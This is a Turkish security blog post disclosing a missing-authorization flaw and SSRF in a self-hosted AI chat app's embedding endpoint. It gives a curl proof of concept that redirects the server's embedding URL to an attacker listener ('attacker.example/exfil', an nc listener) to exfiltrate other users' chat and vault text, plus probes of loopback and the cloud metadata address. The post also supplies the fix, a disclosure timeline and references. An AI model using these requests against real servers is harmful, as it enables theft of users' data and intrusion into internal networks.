---
layout: post
title: "Odysseus: AI Embedding Endpoint'inde Broken Access Control + SSRF (CVE-2026-70619, CVE-2026-70620)"
author: Yunus Aydın
date: 2026-06-16
lang: tr
description: "Odysseus CVE-2026-70619/CVE-2026-70620: embedding endpoint'inde broken access control. Admin kontrolü olmayan API ile embedding URL ele geçirme ve tüm chat/RAG/vault verisini sızdırma."
keywords: "Odysseus güvenlik açığı, CVE-2026-70619, CVE-2026-70620, broken access control AI, SSRF embedding endpoint, BOLA AI sunucu, LLM güvenlik araştırması, self-hosted AI zafiyeti, embedding API ele geçirme, require_admin atlatma"
canonical_url: "https://aydinnyunus.github.io/2026/06/16/odysseus-embedding-endpoint-takeover-tr/"
---

Repo'nun zafiyet bildirmek için özel bir kanalı yoktu, ben de public issue olarak açtım: [pewdiepie-archdaemon/odysseus#132](https://github.com/pewdiepie-archdaemon/odysseus/issues/132). Bu yazı detaylı versiyon.

## TL;DR

[Odysseus](https://github.com/pewdiepie-archdaemon/odysseus) (self-hosted AI chat / RAG / memory uygulaması) içindeki `POST /api/embeddings/endpoint`, auth ile korunuyor; admin ile değil. Kod tabanındaki diğer her privileged router `core.middleware.require_admin(request)`'i çağırıyor. Bu çağırmıyor. Admin olmayan bir kullanıcı şunları yapabiliyor:

1. **Sunucu genelindeki** embedding URL'sini kontrol ettiği bir hosta yönlendirebiliyor. Sonraki embedding çağrısında diğer tüm kullanıcıların chat, RAG, memory ve vault metni saldırgana düz metin olarak gönderiliyor.
2. Anında bir `httpx.post` outbound isteği tetikliyor. Scheme, host, private IP ya da DNS rebind doğrulaması **sıfır**. Bu da SSRF.
3. Hijack'i `data/embedding_endpoint.json` ve `EMBEDDING_URL` env var'a yazıyor. Restart'ı atlatıyor.
4. `DELETE` ile global config'i siliyor veya keyfi HuggingFace model indirmelerini tetikliyor. DoS.

Aynı handler hem access control bug'ı hem de SSRF sink'i. İki bug class'ı, bir eksik satır.

## Savunmasız router

İlgili route'lar `routes/embedding_routes.py`'de:

- `POST /api/embeddings/endpoint` (global embedding URL'sini set et)
- `DELETE /api/embeddings/endpoint` (temizle)
- `POST /api/embeddings/models/{name}/download`
- `DELETE /api/embeddings/models/{name}`

Dördü de state değiştiriyor. Dördü de global, kullanıcı bazında değil. Hiçbiri `require_admin(request)` çağırmıyor. Sadece bir session olduğunu kontrol edip duruyor.

Referans olsun: kod tabanındaki diğer her privileged router (kullanıcı yönetimi, auth setup, sistem config) handler'ın en üstünde `require_admin(request)`'i çağırıyor. Bu router istisna.

## Asıl sebep

Aynı handler'da iki bağımsız sorun var:

1. **Yetkilendirme eksik.** Endpoint sadece authentication zorluyor. Rol kontrolü yok, dolayısıyla giriş yapmış herhangi bir hesap global state'i değiştirebiliyor.
2. **URL doğrulaması yok.** Kullanıcıdan gelen `url` parametresi doğrudan `httpx.post` probe'una gidiyor. Scheme allow-list yok, private / loopback / link-local adres reddi yok, DNS çözümleme kontrolü yok, `follow_redirects=False` yok. Kod tabanında zaten `src/webhook_manager.py`'de doğru işi yapan `validate_webhook_url` helper'ı mevcut. Embedding handler bunu çağırmıyor.

İlk sorun, ikinciyi signup yapmış herhangi birinin ulaşabileceği bir SSRF primitive'ine çeviriyor.

## Proof of concept

Container'ı build edip `docker run odysseus:vuln-0001`'i çalıştırdım, listener'ı kurdum:

```bash
# Saldırgan listener host 9999 portunda; container içinden
# host.containers.internal:9999 üzerinden erişilebilir
nc -l 9999
```

`/api/auth/setup` ile admin oluşturdum, signup'ı açtım, `/api/auth/signup` üzerinden `alice` kaydı yaptım. Alice'in admin olmadığını teyit ettim: `GET /api/auth/users` onun cookie'siyle `403` dönüyor. Bu pre-flight önemli: konu "admin işlerini admin yapabiliyor" değil, konu "hesabı olan herkes admin işlerini yapabiliyor".

### Adım 1: auth kontrolü çalışıyor

```bash
$ curl -X POST .../api/embeddings/endpoint \
       -d 'url=http://attacker.example/exfil&model=pwn'
401  {"error":"Not authenticated"}
```

Yani auth'suz istek doğru şekilde reddediliyor. Şimdi asıl bug.

### Adım 2: admin olmayan alice 200 alıyor

```bash
$ curl -b alice.cookies -X POST .../api/embeddings/endpoint \
       -d 'url=http://host.containers.internal:9999/exfil&model=pwn'
200  {"success":true,
      "url":"http://host.containers.internal:9999/exfil",
      "model":"pwn"}
```

Alice admin değil. Sunucu isteği kabul etti ve global embedding URL'sini güncelledi.

### Adım 3: outbound probe saldırgana düşüyor

```text
HIT  {"path":"/exfil","body":{"input":["test"],"model":"pwn"}}
```

Handler yeni endpoint'i doğrulamak için anında bir `httpx.post` outbound atıyor. Doğrulama isteğinin kendisi saldırgan altyapısına gidiyor. Bundan sonra kutudaki her gerçek embedding çağrısı da aynı yere gidecek.

### Adım 4: kalıcılık

```bash
$ docker exec odysseus-vuln cat /app/data/embedding_endpoint.json
{"url":"http://host.containers.internal:9999/exfil","model":"pwn"}
```

Diske ve `EMBEDDING_URL` env var'a yazıldı. Container restart'ı atlatıyor.

### Adım 5: global olarak görünüyor

```bash
$ curl -b admin.cookies .../api/embeddings/endpoint
{"url":"http://host.containers.internal:9999/exfil",
 "model":"pwn","active":true}
```

Gerçek admin embeddings sayfasını açtığında UI alice'in hijack'ini gösteriyor. Kullanıcı bazında embedding URL'si diye bir şey yok. Tüm sunucu için tek URL var.

## Bonus SSRF erişimi

Aynı endpoint, host doğrulaması yok. İki hızlı probe:

**Sunucunun kendi admin yüzeyine loopback.** 405 body'si error mesajı üzerinden response'u sızdırıyor:

```bash
$ curl -b alice.cookies -X POST .../api/embeddings/endpoint \
       -d 'url=http://127.0.0.1:7000/api/auth/status&model=pwn'
400  {"detail":"Endpoint unreachable: Client error '405 Method Not Allowed'
      for url 'http://127.0.0.1:7000/api/auth/status' ..."}
```

**Cloud metadata IP.** Test host'ta timeout aldı, ama outbound atıldı. IMDSv1 erişilebilir gerçek bir cloud VM'de istek düşecekti:

```bash
$ curl -b alice.cookies -X POST .../api/embeddings/endpoint \
       -d 'url=http://169.254.169.254/latest/meta-data/&model=pwn'
400  {"detail":"Endpoint unreachable: timed out"}
```

Error wrapper 2xx olmayan response'ların body'sinin bir kısmını dışarı sızdırıyor. Bu da partial blind'dan semi-blind'a doğru bir SSRF okuma primitive'i veriyor. Kalıcılık davranışıyla birlikte, hijack'i internal servislere yönelterek ilginç bir şey cevap verene kadar bekletebilirsiniz.

## Etki

- **Instance üzerindeki her kullanıcının verisinin dışarı çıkarılması.** Chat mesajları, RAG sorguları, memory girdileri, vault metni. Sunucu tarafında embed edilen her şey saldırgan URL'sine düz metin olarak akıyor. Burada kullanıcı bazında izolasyon yok.
- **Internal ağa SSRF.** Loopback, RFC1918, link-local, cloud metadata. Hiçbiri filtrelenmiyor.
- **Kalıcılık.** Hijack `data/embedding_endpoint.json` ve `EMBEDDING_URL` env var'da yaşıyor. Container restart bunu temizlemiyor. Admin'in embeddings sayfasına bakma fikrinin gelmesi gerekiyor.
- **DoS.** Aynı yetkisiz route setinden global config'i silebilir veya HuggingFace model indirmelerini tetikleyebilirsiniz.

Birden fazla kullanıcılı self-hosted deployment için critical. Tek kullanıcılı deployment için bile SSRF'nin host ağına erişimi yüzünden high.

## Düzeltme

İki ufak değişiklik:

```python
# routes/embedding_routes.py
from core.middleware import require_admin
from src.webhook_manager import validate_webhook_url

@router.post("/endpoint")
async def set_embedding_endpoint(request: Request, ...):
    require_admin(request)              # 1. route'u admin'e gate et
    validate_webhook_url(url)           # 2. probe'tan önce URL'yi doğrula
    # ... mevcut probe / persist mantığı ...
```

Aynı çifti `DELETE /endpoint`, `POST /models/{name}/download`, `DELETE /models/{name}` için de uygulayın. Sonra kod tabanındaki diğer her router'ı aynı pattern için audit edin. Middleware zaten var. Validator zaten var. Eksik olan tek şey çağrıydı.

SSRF tarafı için `validate_webhook_url` en azından şunları yapmalı: `http`/`https` scheme allow-list, private / loopback / link-local / `169.254.169.254` adres reddi, DNS çözümleyip çözümlenmiş IP'yi tekrar kontrol (DNS rebinding savunması), `httpx.post`'a `follow_redirects=False` geçişi (public allow-list'teki host'un internal ağa redirect atamaması için).

## Bu pattern neden tekrar tekrar çıkıyor

Aynı kökün iki yarısı:

1. **"Authenticated" ile "authorized" birbirine karıştırılıyor.** Middleware ayrımı zaten var (`require_auth` vs. `require_admin`), ama yeni bir route yazıldığında developer `require_auth`'u ekliyor (çünkü logged-out kullanıcılar buraya gelmemeli, bariz), admin kontrolünü eklemeyi atlıyor. Code review tek başına bakınca diff makul göründüğü için yakalayamıyor. Yakalamanın tek yolu dosyayı diğer her privileged router'la yan yana okuyup admin çağrısı olmayan tek dosyanın bu olduğunu fark etmek.
2. **URL input'ları data olarak değerlendiriliyor.** Kullanıcıdan gelen bir URL data değildir. Sunucunun kullanıcı adına yapacağı bir istektir. Bir sunucudan giden her external HTTP çağrısı URL parametresini bir yerden alıyor ve eğer o yer kendi static config'iniz değilse, URL'nin sunucunun nereye bağlanacağına karar veren herhangi bir kod parçasıyla aynı muameleyi görmesi gerekiyor.

CWE-862 (Missing Authorization) ve CWE-918 (SSRF) aynı handler'da. OWASP Top 10 karşılıkları A01 (Broken Access Control) ve A10 (SSRF). İkisi de boşuna top 10 değil.

## Raporlama zaman çizelgesi

- **14 Haziran 2026**: Zafiyet `routes/embedding_routes.py`'de tespit edildi. `odysseus:vuln-0001` Docker image'ında reprodüksiyon teyit edildi.
- **14 Haziran 2026**: Public issue [#132](https://github.com/pewdiepie-archdaemon/odysseus/issues/132) açıldı. Repo'da özel bir güvenlik bildirim kanalı, `SECURITY.md` ya da güvenlik email'i yok. Public issue tek seçenekti.
- **14 Haziran 2026**: Bu yazı yayınlandı.
- **4 Ağustos 2026**: Bu raporun iki bug class'ı için VulnCheck tarafından iki CVE atandı: [CVE-2026-70619](https://www.cve.org/CVERecord?id=CVE-2026-70619) (CWE-862 Missing Authorization, CVSS 3.1 8.8 High) ve [CVE-2026-70620](https://www.cve.org/CVERecord?id=CVE-2026-70620) (CWE-918 SSRF, CVSS 3.1 6.8 Medium).

Kullanıcı verisi işleyen bir proje maintain ediyorsanız lütfen özel raporlama kanallı bir `SECURITY.md` ekleyin. Düzeltilmemiş zafiyetler için public issue kimsenin tercihi değil.

## Referanslar

- **CWE-862**: Missing Authorization. [https://cwe.mitre.org/data/definitions/862.html](https://cwe.mitre.org/data/definitions/862.html)
- **CWE-918**: Server-Side Request Forgery (SSRF). [https://cwe.mitre.org/data/definitions/918.html](https://cwe.mitre.org/data/definitions/918.html)
- **OWASP API Top 10, API1:2023**: Broken Object Level Authorization. [https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- **OWASP Top 10, A01:2021**: Broken Access Control. [https://owasp.org/Top10/A01_2021-Broken_Access_Control/](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **OWASP Top 10, A10:2021**: SSRF. [https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- **Public issue**: [pewdiepie-archdaemon/odysseus#132](https://github.com/pewdiepie-archdaemon/odysseus/issues/132)
- **CVE-2026-70619**: Odysseus embedding endpoint'inde Missing Authorization. [https://www.cve.org/CVERecord?id=CVE-2026-70619](https://www.cve.org/CVERecord?id=CVE-2026-70619)
- **CVE-2026-70620**: Odysseus embedding endpoint config'inde SSRF. [https://www.cve.org/CVERecord?id=CVE-2026-70620](https://www.cve.org/CVERecord?id=CVE-2026-70620)

## İlgili içerik

- [SSRF in LollMS Export: CVE-2026-0560](https://aydinnyunus.github.io/2026/03/28/ssrf-lollms-export-content-cve-2026-0560-tr/)
- [SSRF via DNS Rebinding](/2026/03/14/ssrf-dns-rebinding-vulnerability-tr/)
- [IDOR in LollMS Friend Requests: CVE-2026-0562](/2026/04/18/idor-lollms-friend-request-cve-2026-0562-tr/)
- [Firecrawl: Bull queue auth key düz metin loglanıyor](/2026/06/16/firecrawl-bull-auth-key-logged-plaintext-tr/)
